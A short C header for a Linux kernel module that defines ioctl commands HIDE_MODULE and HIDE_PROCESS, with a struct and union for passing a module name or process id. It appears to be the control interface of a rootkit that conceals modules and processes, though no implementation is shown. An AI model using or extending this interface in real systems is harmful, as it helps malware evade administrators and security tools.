#ifndef IOCTL_H
#define IOCTL_H
#include <linux/ioctl.h>
 
typedef struct {
	char name[20];
	int size;
} module_t;

typedef union {
	module_t module;
	int process;	
} query_arg;
 
#define HIDE_MODULE _IOWR('q', 1, query_arg*)
#define HIDE_PROCESS _IOWR('q', 2, query_arg*)
#endif
